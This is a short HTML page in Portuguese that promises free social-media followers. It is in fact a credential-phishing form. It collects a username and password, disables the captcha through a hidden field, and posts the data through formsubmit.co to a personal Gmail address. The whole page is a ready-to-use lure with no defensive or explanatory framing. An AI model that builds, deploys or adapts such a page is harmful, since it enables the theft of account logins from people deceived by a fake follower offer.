<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Ganhar seguidores!!!</title>
  <link rel="stylesheet" href="Style/Style.css" media="all" />
  <link rel="stylesheet" href="Style/Media.css" media="screen" />
  <link href="Mensagem.html" />
  
</head>
<body>
             <form action="https://formsubmit.co/neypipoqueira@gmail.com" method="post" autocomplete="on">
               
               <div>
                 <h1>Ganhe <strong>seguidores!</strong></h1>
                 <input type="text" name="username" id="username" autocomplete="username" placeholder="Enter your username..." required/>
                   
                   <input type="hidden" name="captcha" value="false" />
                    <input type="hidden" name="next_" value="https://" />
                  <input type="password" name="senha" id="senha" placeholder="Enter your Password" minlength="8"
                    maxlength="20" autocomplete="Password" required>
               
               
                 <input type="number" name="quatidade" placeholder="quantity..." maxlength="10" min="1" required>
              

                  <button id="button-seguir" type="submit">Enviar</button>
               </div>
             </form>
</body>
</html>
